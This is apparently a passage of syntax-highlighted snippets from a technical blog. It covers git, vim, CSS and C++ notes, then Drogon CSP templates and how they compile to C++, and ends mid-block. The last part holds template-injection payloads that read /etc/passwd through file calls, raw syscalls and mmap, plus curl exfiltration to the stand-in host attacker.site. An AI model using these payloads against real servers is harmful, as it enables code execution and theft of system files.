<span class="token function">curl</span> some.api.site/api/v1/users/ <span class="token parameter variable">-s</span> <span class="token operator">|</span> jq <span class="token operator">|</span> <span class="token function">less</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " data-label="Server" tabindex="0"><code class="language-sh">python <span class="token parameter variable">-m</span> uploadserver</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " data-label="Client" tabindex="0"><code class="language-sh"><span class="token function">curl</span> <span class="token parameter variable">-F</span> <span class="token assign-left variable">files</span><span class="token operator">=</span>@file1.txt <span class="token parameter variable">-F</span> <span class="token assign-left variable">files</span><span class="token operator">=</span>@file2.txt <span class="token number">192.168</span>.45.179:8000/upload</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token comment"># Make new branch.</span>
<span class="token function">git</span> checkout <span class="token parameter variable">-b</span> <span class="token operator">&lt;</span>name<span class="token operator">&gt;</span>
<span class="token comment"># </span>
<span class="token comment"># Checkout commits in tree before HEAD.</span>
<span class="token function">git</span> checkout HEAD~1  <span class="token comment"># 1 commit before.</span>
<span class="token function">git</span> checkout HEAD~10 <span class="token comment"># 10 commits before.</span>
<span class="token comment"># </span>
<span class="token comment"># Checkout commit from parent.</span>
<span class="token function">git</span> checkout HEAD^  <span class="token comment"># 1 commit before (from parent 1, base).</span>
<span class="token function">git</span> checkout HEAD^2 <span class="token comment"># 1 commit before (from parent 2, target).</span>
<span class="token comment"># </span>
<span class="token comment"># Store changes locally.</span>
<span class="token function">git</span> stash
<span class="token function">git</span> stash pop
<span class="token comment"># </span>
<span class="token comment"># Clean edited files.</span>
<span class="token function">git</span> reset <span class="token punctuation">[</span>--hard<span class="token punctuation">]</span>
<span class="token comment"># --hard removes unstaged files.</span>
<span class="token comment"># </span>
<span class="token comment"># View changes.</span>
<span class="token function">git</span> <span class="token function">diff</span> <span class="token operator">|</span> <span class="token function">less</span>
<span class="token function">git</span> <span class="token function">diff</span> <span class="token operator">&lt;</span>file<span class="token operator">&gt;</span> <span class="token comment"># See change in specific file.</span>
<span class="token comment"># </span>
<span class="token comment"># Jump through commits (to find, say, the cause of a bug).</span>
<span class="token function">git</span> bisect <span class="token punctuation">[</span>start<span class="token operator">|</span>reset<span class="token operator">|</span>good<span class="token operator">|</span>bad<span class="token operator">|</span>skip<span class="token punctuation">]</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token comment"># Command-line git tree from git log.</span>
<span class="token function">git</span> log <span class="token parameter variable">--graph</span> --abbrev-commit <span class="token parameter variable">--decorate</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>format:<span class="token string">'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(bold yellow)%d%C(reset)'</span> <span class="token parameter variable">--all</span>
<span class="token comment"># </span>
<span class="token comment"># More detailed git-tree </span>
<span class="token function">git</span> log <span class="token parameter variable">--graph</span> --abbrev-commit <span class="token parameter variable">--decorate</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>format:<span class="token string">'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(bold yellow)%d%C(reset)%n'</span>'          %C<span class="token punctuation">(</span>white<span class="token punctuation">)</span>%s%C<span class="token punctuation">(</span>reset<span class="token punctuation">)</span> %C<span class="token punctuation">(</span>dim white<span class="token punctuation">)</span>- %an%C<span class="token punctuation">(</span>reset<span class="token punctuation">)</span>' <span class="token parameter variable">--all</span>
<span class="token comment"># </span>
<span class="token comment"># Add them as git aliases in ~/.gitconfig or script aliases in ~/.bashrc.</span>
<span class="token comment"># See https://stackoverflow.com/a/9074343/10239789.</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">:wq  <span class="token comment"># Write to file + exit.</span>
:q<span class="token operator">!</span>  <span class="token comment"># Force exit.</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">'\x01\x02'</span>
<span class="token comment"># </span>
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">'\x41'</span> <span class="token operator">|</span> xxd
<span class="token comment"># 00000000: 41                     A</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh">perl <span class="token parameter variable">-e</span> <span class="token string">'print "\x41"x4 . "\x42\x43"'</span> <span class="token operator">|</span> xxd
<span class="token comment"># 00000000: 4141 4141 4243         AAAABC</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">assert</span> <span class="token string">'\xc0'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'\xc3\x80'</span></code></pre>
<pre data-lang-off="" class="language-html" tabindex="0"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fas fa-rocket<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">&gt;</span></span></code></pre>
<pre class="language-css" tabindex="0"><code class="language-css"><span class="token selector">.fas</span> <span class="token punctuation">{</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"Font Awesome 6 Free"</span>
  <span class="token property">font-style</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>
  <span class="token property">font-weight</span><span class="token punctuation">:</span> 900<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"Font Awesome 6 Free"</span><span class="token punctuation">;</span>
    <span class="token property">font-style</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>
    <span class="token property">font-weight</span><span class="token punctuation">:</span> 900<span class="token punctuation">;</span>
    <span class="token property">font-display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>../webfonts/fa-solid-900.woff2<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"woff2"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>../webfonts/fa-solid-900.ttf<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"truetype"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-css" tabindex="0"><code class="language-css"><span class="token selector">.fa-rocket:before</span> <span class="token punctuation">{</span>
  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">"\f135"</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// --- Dynamic ---</span>

size_t size <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token operator">*</span> array1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">// `size` is dynamic. e.g. can change with input.</span>
<span class="token comment">// Note that we can also resize the array and reassign the pointer.</span>

<span class="token comment">// Use the array...</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    array1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

<span class="token keyword">delete</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array1<span class="token punctuation">;</span>


<span class="token comment">// --- Static ---</span>

<span class="token comment">// Define a maximum capacity...</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_SIZE</span> <span class="token expression"><span class="token number">100</span>                </span><span class="token comment">// ...with a macro,</span></span>
<span class="token comment">// constexpr size_t MAX_SIZE = 100; // ...or use C++'s type-safe constexpr.</span>

<span class="token keyword">int</span> array2<span class="token punctuation">[</span>MAX_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// Use the array... (be careful to use `size` instead of `MAX_SIZE`).</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    array2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// STL</span>
<span class="token comment">// Allocate a dynamic vector (on the heap). Capacity grows on-demand.</span>
std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> vec1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// ETL</span>
<span class="token comment">// Allocate a static vector (on the stack) with fixed capacity.</span>
etl<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token operator">&gt;</span> vec2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Hi <span class="token punctuation">[</span><span class="token punctuation">[</span> name <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Bye <span class="token punctuation">[</span><span class="token punctuation">[</span> name <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span></code></pre>
<pre data-label="main.cpp" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token function">app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">registerHandler</span><span class="token punctuation">(</span>
    <span class="token string">"/hello/{}"</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> HttpRequestPtr<span class="token operator">&amp;</span> req<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">const</span> HttpResponsePtr<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&amp;&amp;</span> callback<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token operator">&amp;</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        HttpViewData data<span class="token punctuation">;</span>
        data<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> resp <span class="token operator">=</span> <span class="token class-name">HttpResponse</span><span class="token double-colon punctuation">::</span><span class="token function">newHttpViewResponse</span><span class="token punctuation">(</span><span class="token string">"Example.csp"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">callback</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class="language-html" tabindex="0"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Hi Picard<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>
<pre class="language-json" tabindex="0"><code class="language-json"><span class="token property">"load_dynamic_views"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
<span class="token property">"dynamic_views_path"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"./views/d"</span><span class="token punctuation">]</span><span class="token punctuation">,</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token function">app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enableDynamicViewsLoading</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"./views/d"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"./views/d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class="language-sh" tabindex="0"><code class="language-sh">drogon_ctl create view Example.csp</code></pre>
<pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Example<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span> $$ <span class="token operator">&lt;&lt;</span> a<span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>h2<span class="token operator">&gt;</span>Hello world<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">&gt;</span></code></pre>
<pre data-label="Example.cc" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Boilerplate: includes...</span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> drogon<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>string <span class="token class-name">Example</span><span class="token double-colon punctuation">::</span><span class="token function">genText</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span> Example_view_data<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"&lt;h1&gt;Example&lt;/h1&gt;\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span> Example_tmp_stream <span class="token operator">&lt;&lt;</span> a<span class="token punctuation">;</span> 
    Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"&lt;h2&gt;Hello world!&lt;/h2&gt;\n"</span><span class="token punctuation">;</span>
    <span class="token comment">// Boilerplate: convert stream to string and return...</span>
<span class="token punctuation">}</span></code></pre>
<pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MY_MACRO</span></span>
<span class="token keyword">void</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Example<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span></code></pre>
<pre data-label="Example.cc" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Boilerplate: includes...</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MY_MACRO</span></span>
<span class="token keyword">void</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

<span class="token keyword">using</span> <span class="token keyword">namespace</span> drogon<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>string <span class="token class-name">Example</span><span class="token double-colon punctuation">::</span><span class="token function">genText</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span> Example_view_data<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"&lt;h1&gt;Example&lt;/h1&gt;\n"</span><span class="token punctuation">;</span>
    <span class="token comment">// Boilerplate: convert stream to string and return...</span>
<span class="token punctuation">}</span></code></pre>
<pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Hi <span class="token punctuation">[</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span></code></pre>
<pre data-label="Example.cc" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// ...</span>
Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"&lt;h1&gt;Hi "</span><span class="token punctuation">;</span>
<span class="token punctuation">{</span>
    <span class="token keyword">auto</span> <span class="token operator">&amp;</span> val<span class="token operator">=</span>Example_view_data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>val<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">typeid</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        Example_tmp_stream<span class="token operator">&lt;&lt;</span><span class="token operator">*</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">any_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>val<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">typeid</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>string<span class="token punctuation">)</span><span class="token operator">||</span>val<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">typeid</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        Example_tmp_stream<span class="token operator">&lt;&lt;</span><span class="token operator">*</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">any_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"!&lt;/h1&gt;\n"</span><span class="token punctuation">;</span>
<span class="token comment">// ...</span></code></pre>
<pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    std<span class="token double-colon punctuation">::</span>ifstream ifs<span class="token punctuation">{</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ifs<span class="token punctuation">.</span><span class="token function">is_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        $$ <span class="token operator">&lt;&lt;</span> ifs<span class="token punctuation">.</span><span class="token function">rdbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        $$ <span class="token operator">&lt;&lt;</span> <span class="token string">"Failed to open file."</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    $$ <span class="token operator">&lt;&lt;</span> buffer<span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span> <span class="token number">0</span>       <span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//  read(      open(      "/etc/passwd", O_RDONLY), buffer, 99);</span>
    $$ <span class="token operator">&lt;&lt;</span> buffer<span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"/usr/bin/curl"</span><span class="token punctuation">,</span>
        <span class="token string">"http://attacker.site"</span><span class="token punctuation">,</span>
        <span class="token string">"--data"</span><span class="token punctuation">,</span>
        <span class="token string">"@/etc/passwd"</span><span class="token punctuation">,</span>
        <span class="token constant">NULL</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token string">"/usr/bin/curl"</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    $$ <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// mmap(addr, length, memory_protection, flags, fd, offset)</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
